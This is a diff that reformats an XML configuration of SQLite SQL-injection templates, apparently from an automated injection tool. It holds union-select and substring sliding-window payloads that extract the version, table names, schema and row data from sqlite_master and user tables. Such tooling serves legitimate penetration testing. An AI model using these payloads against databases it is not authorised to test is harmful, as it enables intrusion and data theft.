@@ -5,39 +5,42 @@
         <info>
 select 
     sqlite_version()
-    ||'${ENCLOSE_VALUE_SQL}'
-    ||'sqlite_master'
-    ||'${ENCLOSE_VALUE_SQL}'
-    ||'anonymous'
-    ||'${TRAIL_SQL}'
+    || '${ENCLOSE_VALUE_SQL}'
+    || 'sqlite_master'
+    || '${ENCLOSE_VALUE_SQL}'
+    || 'anonymous'
+    || '${TRAIL_SQL}'
         </info>
         <schema>
             <database>
 select 
     '${ENCLOSE_VALUE_SQL}'
-    ||r
-    ||'${SEPARATOR_QTE_SQL}'
-    ||q
-    ||'${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+    || r
+    || '${SEPARATOR_QTE_SQL}'
+    || q
+    || '${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
 from (
     select 
-        'sqlite_master'r, 
-        count(*)q 
+        'sqlite_master' r, 
+        count(*) q 
     from sqlite_master 
-    WHERE type='table'
+    WHERE type = 'table'
 )
 {limit}
             </database>
             <table>
-select group_concat(
-    '${ENCLOSE_VALUE_SQL}'
-    ||name
-    ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}','${SEPARATOR_CELL_SQL}'
-)||'${TRAIL_SQL}'
+select 
+    group_concat(
+        '${ENCLOSE_VALUE_SQL}'
+        || name
+        || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}',
+        '${SEPARATOR_CELL_SQL}'
+    )
+    || '${TRAIL_SQL}'
 from (
     select * 
     from sqlite_master 
-    WHERE type='table'
+    WHERE type = 'table'
     ORDER BY tbl_name
     {limit}
 )
@@ -45,22 +48,25 @@ from (
             <column>
 select 
     sql
-    ||'${TRAIL_SQL}'
+    || '${TRAIL_SQL}'
 from sqlite_master 
-where tbl_name='${TABLE}'
-and type='table'
+where tbl_name = '${TABLE}'
+and type = 'table'
 {limit}
             </column>
             <row>
                 <query>
-select ifnull(
-    group_concat(
-        '${ENCLOSE_VALUE_SQL}'
-        ||r
-        ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}',
-        '${SEPARATOR_CELL_SQL}'
-    ),
-'')||'${TRAIL_SQL}'
+select 
+    ifnull(
+        group_concat(
+            '${ENCLOSE_VALUE_SQL}'
+            || r
+            || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}',
+            '${SEPARATOR_CELL_SQL}'
+        ),
+        ''
+    )
+    || '${TRAIL_SQL}'
 from (
     select distinct ${FIELDS} r 
     from ${TABLE}
@@ -68,24 +74,55 @@ from (
 )
                 </query>
                 <fields>
-                <field>trim(ifnull(${FIELD},''))</field>
-                <concat>||'%7f'||</concat>
+                <field>
+trim(
+    ifnull(
+        ${FIELD}, 
+        ''
+    )
+)
+                </field>
+                <concat>|| '%7f' ||</concat>
                 </fields>
             </row>
         </schema>
     </resource>
     <strategy>
         <configuration>
-            <slidingWindow>(select'${LEAD}'||substr((${INJECTION}),${INDEX},65536))</slidingWindow>
-            <limit> limit 65536 offset ${LIMIT}</limit>
+            <slidingWindow>
+(
+    select
+        '${LEAD}' 
+        || substr(
+            (${INJECTION}), 
+            ${INDEX}, 
+            65536
+        )
+)
+            </slidingWindow>
+            <limit>limit 65536 offset ${LIMIT}</limit>
             <failsafe>1337${INDICE}7330%2b1</failsafe>
-            <calibrator>replace(substr(quote(zeroblob((65536%2B1)/2)),3,65536),'0','${CALIBRATOR_SQL}')</calibrator>
+            <calibrator>
+replace(
+    substr(
+        quote(
+            zeroblob(
+                (65536%2B1) / 2
+            )
+        ),
+        3,
+        65536
+    ),
+    '0',
+    '${CALIBRATOR_SQL}'
+)
+            </calibrator>
             <limitBoundary>0</limitBoundary>
         </configuration>
         <normal>
-            <indices> union select ${INDICES}</indices>
-            <capacity>(select'${LEAD}${INDICE}'||${CALIBRATOR})</capacity>
-            <orderBy> order by 1337</orderBy>
+            <indices>union select ${INDICES}</indices>
+            <capacity>(select '${LEAD}${INDICE}' || ${CALIBRATOR})</capacity>
+            <orderBy>order by 1337</orderBy>
         </normal>
     </strategy>
 </model>
